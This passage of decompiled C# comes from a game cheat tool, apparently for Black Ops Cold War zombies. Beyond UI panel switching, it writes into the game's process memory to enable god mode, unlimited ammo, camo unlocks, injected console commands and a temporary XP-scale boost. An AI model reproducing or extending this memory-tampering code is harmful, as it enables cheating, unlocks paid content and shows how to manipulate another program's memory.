			this.PlayerSelectPnl();
			this.playerUpdate(Booleans.P4GM, Booleans.P4IA, Booleans.P4UP, Booleans.P4AC, Booleans.P4RF, Booleans.P4WPC, Variables.p4wpn, Variables.p4wpn2, Variables.tp);
			this.TeleportSelectorCombo.SelectedIndex = 0;
		}

		// Token: 0x0600048D RID: 1165 RVA: 0x00005140 File Offset: 0x00005140
		private void a2_Paint(object sender, PaintEventArgs e)
		{
		}

		// Token: 0x0600048E RID: 1166 RVA: 0x00028CF0 File Offset: 0x00028CF0
		private void button8_Click(object sender, EventArgs e)
		{
			this.a1.Visible = false;
			this.a2.Visible = false;
			this.a3.Visible = true;
			this.PlayerAllOptionsPnl.Visible = false;
			this.Player1OptionsPnl.Visible = false;
			this.Player2OptionsPnl.Visible = false;
			this.Player3OptionsPnl.Visible = false;
			this.Player4OptionsPnl.Visible = true;
			MainForm.SelectedPlayer = 4;
			this.PlayerSelectPnl();
			this.playerUpdate(Booleans.P4GM, Booleans.P4IA, Booleans.P4UP, Booleans.P4AC, Booleans.P4RF, Booleans.P4WPC, Variables.p4wpn, Variables.p4wpn2, Variables.tp);
			this.TeleportSelectorCombo.SelectedIndex = 0;
		}

		// Token: 0x0600048F RID: 1167 RVA: 0x00028DA8 File Offset: 0x00028DA8
		private void button7_Click(object sender, EventArgs e)
		{
			this.a1.Visible = false;
			this.a2.Visible = false;
			this.a3.Visible = true;
			this.PlayerAllOptionsPnl.Visible = false;
			this.Player1OptionsPnl.Visible = false;
			this.Player2OptionsPnl.Visible = false;
			this.Player3OptionsPnl.Visible = true;
			this.Player4OptionsPnl.Visible = false;
			MainForm.SelectedPlayer = 3;
			this.PlayerSelectPnl();
			this.playerUpdate(Booleans.P3GM, Booleans.P3IA, Booleans.P3UP, Booleans.P3AC, Booleans.P3RF, Booleans.P3WPC, Variables.p3wpn, Variables.p3wpn2, Variables.tp);
			this.TeleportSelectorCombo.SelectedIndex = 0;
		}

		// Token: 0x06000490 RID: 1168 RVA: 0x00028E60 File Offset: 0x00028E60
		private void button6_Click(object sender, EventArgs e)
		{
			this.a1.Visible = false;
			this.a2.Visible = false;
			this.a3.Visible = true;
			this.PlayerAllOptionsPnl.Visible = false;
			this.Player1OptionsPnl.Visible = false;
			this.Player2OptionsPnl.Visible = true;
			this.Player3OptionsPnl.Visible = false;
			this.Player4OptionsPnl.Visible = false;
			MainForm.SelectedPlayer = 2;
			this.PlayerSelectPnl();
			this.playerUpdate(Booleans.P2GM, Booleans.P2IA, Booleans.P2UP, Booleans.P2AC, Booleans.P2RF, Booleans.P2WPC, Variables.p2wpn, Variables.p2wpn2, Variables.tp);
			this.TeleportSelectorCombo.SelectedIndex = 0;
		}

		// Token: 0x06000491 RID: 1169 RVA: 0x00028F18 File Offset: 0x00028F18
		private void button5_Click(object sender, EventArgs e)
		{
			this.a1.Visible = false;
			this.a2.Visible = false;
			this.a3.Visible = true;
			this.PlayerAllOptionsPnl.Visible = false;
			this.Player1OptionsPnl.Visible = true;
			this.Player2OptionsPnl.Visible = false;
			this.Player3OptionsPnl.Visible = false;
			this.Player4OptionsPnl.Visible = false;
			MainForm.SelectedPlayer = 1;
			this.PlayerSelectPnl();
			this.playerUpdate(Booleans.P1GM, Booleans.P1IA, Booleans.P1UP, Booleans.P1AC, Booleans.P1RF, Booleans.P1WPC, Variables.p1wpn, Variables.p1wpn2, Variables.tp);
			this.TeleportSelectorCombo.SelectedIndex = 0;
		}

		// Token: 0x06000492 RID: 1170 RVA: 0x00028FD0 File Offset: 0x00028FD0
		private void button4_Click(object sender, EventArgs e)
		{
			this.a1.Visible = false;
			this.a2.Visible = false;
			this.a3.Visible = true;
			this.PlayerAllOptionsPnl.Visible = true;
			this.Player1OptionsPnl.Visible = false;
			this.Player2OptionsPnl.Visible = false;
			this.Player3OptionsPnl.Visible = false;
			this.Player4OptionsPnl.Visible = false;
		}

		// Token: 0x06000493 RID: 1171 RVA: 0x0002699A File Offset: 0x0002699A
		private void button3_Click(object sender, EventArgs e)
		{
			this.a1.Visible = false;
			this.a2.Visible = true;
			this.a3.Visible = false;
		}

		// Token: 0x06000494 RID: 1172 RVA: 0x00005140 File Offset: 0x00005140
		private void MainBackgroundImage_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x06000495 RID: 1173 RVA: 0x0002640C File Offset: 0x0002640C
		private void button2_Click_1(object sender, EventArgs e)
		{
			this.a1.Visible = true;
			this.a2.Visible = false;
			this.a3.Visible = false;
		}

		// Token: 0x06000496 RID: 1174 RVA: 0x0002640C File Offset: 0x0002640C
		private void HomeBtn_Click_1(object sender, EventArgs e)
		{
			this.a1.Visible = true;
			this.a2.Visible = false;
			this.a3.Visible = false;
		}

		// Token: 0x06000497 RID: 1175 RVA: 0x0002699A File Offset: 0x0002699A
		private void siticoneButton1_Click_1(object sender, EventArgs e)
		{
			this.a1.Visible = false;
			this.a2.Visible = true;
			this.a3.Visible = false;
		}

		// Token: 0x06000498 RID: 1176 RVA: 0x00029040 File Offset: 0x00029040
		private void siticoneButton2_Click_1(object sender, EventArgs e)
		{
			this.a1.Visible = false;
			this.a2.Visible = false;
			this.a3.Visible = true;
			this.PlayerAllOptionsPnl.Visible = true;
			this.Player1OptionsPnl.Visible = false;
			this.Player2OptionsPnl.Visible = false;
			this.Player3OptionsPnl.Visible = false;
			this.Player4OptionsPnl.Visible = false;
		}

		// Token: 0x06000499 RID: 1177 RVA: 0x000290B0 File Offset: 0x000290B0
		private void siticoneButton3_Click_1(object sender, EventArgs e)
		{
			this.a1.Visible = false;
			this.a2.Visible = false;
			this.a3.Visible = true;
			this.PlayerAllOptionsPnl.Visible = false;
			this.Player1OptionsPnl.Visible = true;
			this.Player2OptionsPnl.Visible = false;
			this.Player3OptionsPnl.Visible = false;
			this.Player4OptionsPnl.Visible = false;
			MainForm.SelectedPlayer = 1;
			this.PlayerSelectPnl();
			this.playerUpdate(Booleans.P1GM, Booleans.P1IA, Booleans.P1UP, Booleans.P1AC, Booleans.P1RF, Booleans.P1WPC, Variables.p1wpn, Variables.p1wpn2, Variables.tp);
			this.TeleportSelectorCombo.SelectedIndex = 0;
		}

		// Token: 0x0600049A RID: 1178 RVA: 0x00029168 File Offset: 0x00029168
		private void siticoneButton4_Click_1(object sender, EventArgs e)
		{
			this.a1.Visible = false;
			this.a2.Visible = false;
			this.a3.Visible = true;
			this.PlayerAllOptionsPnl.Visible = false;
			this.Player1OptionsPnl.Visible = false;
			this.Player2OptionsPnl.Visible = true;
			this.Player3OptionsPnl.Visible = false;
			this.Player4OptionsPnl.Visible = false;
			MainForm.SelectedPlayer = 2;
			this.PlayerSelectPnl();
			this.playerUpdate(Booleans.P2GM, Booleans.P2IA, Booleans.P2UP, Booleans.P2AC, Booleans.P2RF, Booleans.P2WPC, Variables.p2wpn, Variables.p2wpn2, Variables.tp);
			this.TeleportSelectorCombo.SelectedIndex = 0;
		}

		// Token: 0x0600049B RID: 1179 RVA: 0x00029220 File Offset: 0x00029220
		private void siticoneButton5_Click_1(object sender, EventArgs e)
		{
			this.a1.Visible = false;
			this.a2.Visible = false;
			this.a3.Visible = true;
			this.PlayerAllOptionsPnl.Visible = false;
			this.Player1OptionsPnl.Visible = false;
			this.Player2OptionsPnl.Visible = false;
			this.Player3OptionsPnl.Visible = true;
			this.Player4OptionsPnl.Visible = false;
			MainForm.SelectedPlayer = 3;
			this.PlayerSelectPnl();
			this.playerUpdate(Booleans.P3GM, Booleans.P3IA, Booleans.P3UP, Booleans.P3AC, Booleans.P3RF, Booleans.P3WPC, Variables.p3wpn, Variables.p3wpn2, Variables.tp);
			this.TeleportSelectorCombo.SelectedIndex = 0;
		}

		// Token: 0x0600049C RID: 1180 RVA: 0x000292D8 File Offset: 0x000292D8
		private void siticoneButton6_Click_1(object sender, EventArgs e)
		{
			this.a1.Visible = false;
			this.a2.Visible = false;
			this.a3.Visible = true;
			this.PlayerAllOptionsPnl.Visible = false;
			this.Player1OptionsPnl.Visible = false;
			this.Player2OptionsPnl.Visible = false;
			this.Player3OptionsPnl.Visible = false;
			this.Player4OptionsPnl.Visible = true;
			MainForm.SelectedPlayer = 4;
			this.PlayerSelectPnl();
			this.playerUpdate(Booleans.P4GM, Booleans.P4IA, Booleans.P4UP, Booleans.P4AC, Booleans.P4RF, Booleans.P4WPC, Variables.p4wpn, Variables.p4wpn2, Variables.tp);
			this.TeleportSelectorCombo.SelectedIndex = 0;
		}

		// Token: 0x0600049D RID: 1181 RVA: 0x00029390 File Offset: 0x00029390
		private void panel2_MouseDown(object sender, MouseEventArgs e)
		{
			this.bool_0 = true;
			this.point_0 = e.Location;
		}

		// Token: 0x0600049E RID: 1182 RVA: 0x000293A8 File Offset: 0x000293A8
		private void panel2_MouseMove(object sender, MouseEventArgs e)
		{
			if (this.bool_0)
			{
				base.Location = new Point(base.Location.X - this.point_0.X + e.X, base.Location.Y - this.point_0.Y + e.Y);
				base.Update();
			}
		}

		// Token: 0x0600049F RID: 1183 RVA: 0x00029410 File Offset: 0x00029410
		private void panel2_MouseUp(object sender, MouseEventArgs e)
		{
			this.bool_0 = false;
		}

		// Token: 0x060004A0 RID: 1184 RVA: 0x0002941C File Offset: 0x0002941C
		private void siticoneButton8_Click(object sender, EventArgs e)
		{
			this.a1.Visible = true;
			this.a2.Visible = false;
			this.a3.Visible = false;
			this.papPanel.Visible = false;
			this.daPanel.Visible = false;
			this.homePanel.Visible = false;
		}

		// Token: 0x060004A1 RID: 1185 RVA: 0x00029474 File Offset: 0x00029474
		private void siticoneButton7_Click_1(object sender, EventArgs e)
		{
			this.a1.Visible = false;
			this.a2.Visible = false;
			this.a3.Visible = false;
			this.papPanel.Visible = false;
			this.daPanel.Visible = false;
			this.homePanel.Visible = true;
		}

		// Token: 0x060004A2 RID: 1186 RVA: 0x000294CC File Offset: 0x000294CC
		private void siticoneButton9_Click(object sender, EventArgs e)
		{
			this.a1.Visible = false;
			this.a2.Visible = false;
			this.a3.Visible = false;
			this.homePanel.Visible = false;
			this.papPanel.Visible = false;
			this.daPanel.Visible = true;
		}

		// Token: 0x060004A3 RID: 1187 RVA: 0x00029524 File Offset: 0x00029524
		private void siticoneButton10_Click(object sender, EventArgs e)
		{
			this.a1.Visible = false;
			this.a2.Visible = false;
			this.a3.Visible = false;
			this.papPanel.Visible = true;
			this.homePanel.Visible = false;
			this.daPanel.Visible = false;
		}

		// Token: 0x060004A4 RID: 1188 RVA: 0x0002957C File Offset: 0x0002957C
		private void button3_Click_1(object sender, EventArgs e)
		{
			if (this.k.IsValidAddr(this.scan))
			{
				this.k.WriteByte(this.scan, Convert.ToByte(MainForm.Camos.nvc.Get(this.comboBox2.Text), 10), false);
			}
		}

		// Token: 0x060004A5 RID: 1189 RVA: 0x000295D0 File Offset: 0x000295D0
		private void button2_Click_2(object sender, EventArgs e)
		{
			gV gV = this.k;
			byte?[] needle = new byte?[]
			{
				new byte?(1),
				new byte?(0),
				new byte?(0),
				new byte?(0),
				new byte?(0),
				new byte?(0),
				new byte?(0),
				new byte?(0),
				new byte?(3),
				new byte?(0),
				new byte?(0),
				new byte?(0),
				new byte?(0),
				new byte?(0),
				new byte?(0),
				new byte?(0),
				new byte?(15),
				new byte?(163),
				null,
				new byte?(175)
			};
			long startAddress = (long)(this.k.BaseAddress + 268435456UL);
			long endAddress = (long)(this.k.BaseAddress + 520093696UL);
			ulong address = gV.FindBytes(needle, (ulong)startAddress, (ulong)endAddress, true, 65535)[0];
			if (this.k.IsValidAddr(address))
			{
				this.outputBox.Text = "Camo Addr: 0x" + address.ToString("X");
				this.scan = address;
				return;
			}
			this.outputBox.Text = "Unable to find address, make sure that one of your camos is shards.";
		}

		// Token: 0x060004A6 RID: 1190 RVA: 0x00029778 File Offset: 0x00029778
		public void executeCMD(string cmd)
		{
			this.Threads.m.WriteXString(this.m.GetPointer(new ulong[]
			{
				Offsets.BaseAddress + Offsets.CMDBufferBase
			}), cmd);
			this.Threads.m.WriteBool(this.m.GetPointer(new ulong[]
			{
				Offsets.BaseAddress + Offsets.CMDBufferBase
			}) - Offsets.CMDBB_Exec, true);
			this.Threads.m.WriteXString(this.m.GetPointer(new ulong[]
			{
				Offsets.BaseAddress + Offsets.CMDBufferBase
			}), cmd);
			this.Threads.m.WriteBool(this.m.GetPointer(new ulong[]
			{
				Offsets.BaseAddress + Offsets.CMDBufferBase
			}) - Offsets.CMDBB_Exec, true);
			this.Threads.m.WriteXString(this.m.GetPointer(new ulong[]
			{
				Offsets.BaseAddress + Offsets.CMDBufferBase
			}), cmd);
			this.Threads.m.WriteBool(this.m.GetPointer(new ulong[]
			{
				Offsets.BaseAddress + Offsets.CMDBufferBase
			}) - Offsets.CMDBB_Exec, true);
			this.Threads.m.WriteXString(this.m.GetPointer(new ulong[]
			{
				Offsets.BaseAddress + Offsets.CMDBufferBase
			}), cmd);
			this.Threads.m.WriteBool(this.m.GetPointer(new ulong[]
			{
				Offsets.BaseAddress + Offsets.CMDBufferBase
			}) - Offsets.CMDBB_Exec, true);
			this.Threads.m.WriteXString(this.m.GetPointer(new ulong[]
			{
				Offsets.BaseAddress + Offsets.CMDBufferBase
			}), cmd);
			this.Threads.m.WriteBool(this.m.GetPointer(new ulong[]
			{
				Offsets.BaseAddress + Offsets.CMDBufferBase
			}) - Offsets.CMDBB_Exec, true);
			this.Threads.m.WriteXString(this.m.GetPointer(new ulong[]
			{
				Offsets.BaseAddress + Offsets.CMDBufferBase
			}), cmd);
			this.Threads.m.WriteBool(this.m.GetPointer(new ulong[]
			{
				Offsets.BaseAddress + Offsets.CMDBufferBase
			}) - Offsets.CMDBB_Exec, true);
		}

		// Token: 0x060004A7 RID: 1191 RVA: 0x000299E9 File Offset: 0x000299E9
		private void siticoneToggleSwitch1_CheckedChanged(object sender, EventArgs e)
		{
			if (this.siticoneToggleSwitch1.Checked)
			{
				this.ToggleDCamo.Checked = false;
				Variables.reticle = 65;
			}
		}

		// Token: 0x060004A8 RID: 1192 RVA: 0x00029A0C File Offset: 0x00029A0C
		private void siticoneToggleSwitch2_CheckedChanged(object sender, EventArgs e)
		{
			if (this.siticoneToggleSwitch2.Checked)
			{
				this.siticoneTrackBar1.Enabled = true;
				return;
			}
			if (!this.siticoneToggleSwitch2.Checked)
			{
				this.siticoneTrackBar1.Value = 1;
				this.siticoneTrackBar1.Enabled = false;
				this.label21.Text = "1";
			}
		}

		// Token: 0x060004A9 RID: 1193 RVA: 0x00029A68 File Offset: 0x00029A68
		private void siticoneTrackBar1_Scroll(object sender, ScrollEventArgs e)
		{
			if (this.siticoneTrackBar1.Value == 0)
			{
				this.Threads.m.WriteFloat(this.Threads.m.GetPointer(new ulong[]
				{
					Offsets.BaseAddress + Offsets.JumpHeight,
					304UL
				}), 45f);
			}
			this.label21.Text = "(x" + this.siticoneTrackBar1.Value.ToString() + ")";
			this.Threads.m.WriteFloat(this.Threads.m.GetPointer(new ulong[]
			{
				Offsets.BaseAddress + Offsets.JumpHeight,
				304UL
			}), (float)this.siticoneTrackBar1.Value);
		}

		// Token: 0x060004AA RID: 1194 RVA: 0x00029B3A File Offset: 0x00029B3A
		private void button4_Click_1(object sender, EventArgs e)
		{
			MessageBox.Show("Coming Soon! In Testing!", "BlackOpsColdWar.exe");
		}

		// Token: 0x060004AB RID: 1195 RVA: 0x00029B4C File Offset: 0x00029B4C
		private void button7_Click_1(object sender, EventArgs e)
		{
			this.Player1GodChk.Checked = false;
			this.Player2GodChk.Checked = false;
			this.Player3GodChk.Checked = false;
			this.Player4GodChk.Checked = false;
			this.Player1UnlimitedPointsChk.Checked = false;
			this.Player2UnlimitedPointsChk.Checked = false;
			this.Player3UnlimitedPointsChk.Checked = false;
			this.Player4UnlimitedPointsChk.Checked = false;
			this.Player1UnlimitedAmmoChk.Checked = false;
			this.Player2UnlimitedAmmoChk.Checked = false;
			this.Player3UnlimitedAmmoChk.Checked = false;
			this.Player4UnlimitedAmmoChk.Checked = false;
			this.Player1RapidFireChk.Checked = false;
			this.Player2RapidFireChk.Checked = false;
			this.Player3RapidFireChk.Checked = false;
			this.Player4RapidFireChk.Checked = false;
			this.Player1OnlyCritChk.Checked = false;
			this.Player2OnlyCritChk.Checked = false;
			this.Player3OnlyCritChk.Checked = false;
			this.Player4OnlyCritChk.Checked = false;
			this.Player1WeaponCycleChk.Checked = false;
			this.Player2WeaponCycleChk.Checked = false;
			this.Player3WeaponCycleChk.Checked = false;
			this.Player4WeaponCycleChk.Checked = false;
			this.ALLAFKDA.Checked = false;
			this.ToggleSPEED.Checked = false;
			this.OneShotZombiesChk.Checked = false;
			this.ToggleDCamo.Checked = false;
			this.TPZC.Checked = false;
			MessageBox.Show("Everything Has Been Successfully Disabled\n\n you can now end match.", "BlackOpsColdWar.exe");
		}

		// Token: 0x060004AC RID: 1196 RVA: 0x00029CC8 File Offset: 0x00029CC8
		private void button6_Click_1(object sender, EventArgs e)
		{
			string cmd = "phys_gravity 99;";
			this.executeCMD(cmd);
		}

		// Token: 0x060004AD RID: 1197 RVA: 0x00029CE4 File Offset: 0x00029CE4
		private void button5_Click_1(object sender, EventArgs e)
		{
			string cmd = "magic_chest_movable 0;";
			this.executeCMD(cmd);
		}

		// Token: 0x060004AE RID: 1198 RVA: 0x00029D00 File Offset: 0x00029D00
		private void button8_Click_1(object sender, EventArgs e)
		{
			this.DisableAll();
			for (int i = 0; i < 4; i++)
			{
				this.Threads.m.WriteFloat(this.PCompPtr(i) + Offsets.PC_RunSpeed, 0f);
			}
			MainForm.jails = new Vectors.Vec3.Vector3((float)Math.Round(MainForm.jailx, 4), (float)Math.Round(MainForm.jaily, 4), (float)Math.Round(MainForm.jailz, 4));
			for (int j = 0; j < 4; j++)
			{
			}
			for (int k = 0; k < 4; k++)
			{
				this.Threads.m.WriteInt64(this.PCompPtr(k) + Offsets.PC_SetWeaponID, 0L);
			}
			float value = 9999999f;
			this.Threads.m.WriteFloat(Offsets.BaseAddress + Offsets.XPScaleBase + Offsets.RankXP1, value);
			this.Threads.m.WriteFloat(Offsets.BaseAddress + Offsets.XPScaleBase + Offsets.RankXP2, value);
			Thread.Sleep(2000);
			float value2 = 1f;
			this.Threads.m.WriteFloat(Offsets.BaseAddress + Offsets.XPScaleBase + Offsets.RankXP1, value2);
			this.Threads.m.WriteFloat(Offsets.BaseAddress + Offsets.XPScaleBase + Offsets.RankXP2, value2);
			this.DisableAll();
		}

		// Token: 0x04000449 RID: 1097
		public Threads Threads;

		// Token: 0x0400044A RID: 1098
		public Coords Coords;

		// Token: 0x0400044B RID: 1099
		private Memory m = new Memory();

		// Token: 0x0400044C RID: 1100
		public IntPtr baseAddress = IntPtr.Zero;

		// Token: 0x0400044D RID: 1101
		public static ulong BaseAddress = 0UL;

		// Token: 0x0400044E RID: 1102
		public static MainForm form = null;

		// Token: 0x0400044F RID: 1103
		private string pname = Process.GetCurrentProcess().ProcessName;

		// Token: 0x04000450 RID: 1104
		private char[] letters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789".ToCharArray();

		// Token: 0x04000451 RID: 1105
		private Random rand = new Random();

		// Token: 0x04000452 RID: 1106
		private bool bool_0;

		// Token: 0x04000453 RID: 1107
		private Point point_0;

		// Token: 0x04000454 RID: 1108
		public static bool bool_1 = true;

		// Token: 0x04000455 RID: 1109
		public static byte[] byte_0 = new byte[1];

		// Token: 0x04000456 RID: 1110
		public static ulong ulong_0 = 0UL;

		// Token: 0x04000457 RID: 1111
		public static ulong ulong_1 = 0UL;

		// Token: 0x04000458 RID: 1112
		public static bool bool_2 = false;

		// Token: 0x04000459 RID: 1113
		public static bool bool_3 = false;

		// Token: 0x0400045A RID: 1114
		public static bool bool_4 = false;

		// Token: 0x0400045B RID: 1115
		public static bool bool_5 = false;

		// Token: 0x0400045C RID: 1116
		public static bool bool_6 = false;

		// Token: 0x0400045D RID: 1117
		public static bool bool_7 = false;

		// Token: 0x0400045E RID: 1118
		public static int SelectedPlayer = 1;

		// Token: 0x0400045F RID: 1119
		public const int WM_NCHITTEST = 132;

		// Token: 0x04000460 RID: 1120
		public const int HT_CLIENT = 1;

		// Token: 0x04000461 RID: 1121
		public const int HT_CAPTION = 2;

		// Token: 0x04000462 RID: 1122
		public int p1 = 1;

		// Token: 0x04000463 RID: 1123
		public int p2 = 1;

		// Token: 0x04000464 RID: 1124
		public int p3 = 1;

		// Token: 0x04000465 RID: 1125
		public int p4 = 1;

		// Token: 0x04000466 RID: 1126
		private gV k;

		// Token: 0x04000467 RID: 1127
		private ulong scan;

		// Token: 0x04000468 RID: 1128
		private string pathh;

		// Token: 0x04000469 RID: 1129
		private static Random vm = new Random();

		// Token: 0x0400046A RID: 1130
		public static Vectors.Vec3.Vector3 jails;

		// Token: 0x0400046B RID: 1131
		public static double jailx = -1098.075;

		// Token: 0x0400046C RID: 1132
		public static double jaily = -1728.992;

		// Token: 0x0400046D RID: 1133
		public static double jailz = -671.875;

		// Token: 0x020000B0 RID: 176
		public class ProcessInfo
		{
			// Token: 0x060004B2 RID: 1202 RVA: 0x0003578C File Offset: 0x0003578C
			public static int GetProcessID(string ProcessName)
			{
				Process[] processes = Process.GetProcesses();
				int result = 0;
				foreach (Process process in processes)
				{
					if (ProcessName == process.ProcessName)
					{
						result = process.Id;
					}
				}
				return result;
			}
		}

		// Token: 0x020000B1 RID: 177
		private class Camos
		{
			// Token: 0x060004B4 RID: 1204 RVA: 0x000357CC File Offset: 0x000357CC
			static Camos()
			{
				NameValueCollection nameValueCollection = new NameValueCollection();
				nameValueCollection["PAP 1"] = "67";
				nameValueCollection["PAP 2"] = "68";
				nameValueCollection["PAP 3"] = "69";
				nameValueCollection["PAP 4"] = "115";
				nameValueCollection["PAP 5"] = "116";
				nameValueCollection["PAP 6"] = "117";
				nameValueCollection["PAP 7"] = "118";
				nameValueCollection["PAP 8"] = "119";
				nameValueCollection["PAP 9"] = "120";
				nameValueCollection["PAP 10"] = "121";
				nameValueCollection["GOLD"] = "61";
				nameValueCollection["DIAMOND"] = "62";
				nameValueCollection["DM ULTRA"] = "63";
				nameValueCollection["GOLDEN ADDER"] = "64";
				nameValueCollection["DARK AETHER"] = "66";
				MainForm.Camos.nvc = nameValueCollection;
			}

			// Token: 0x0400051A RID: 1306
			public static NameValueCollection nvc;
		}
	}
}
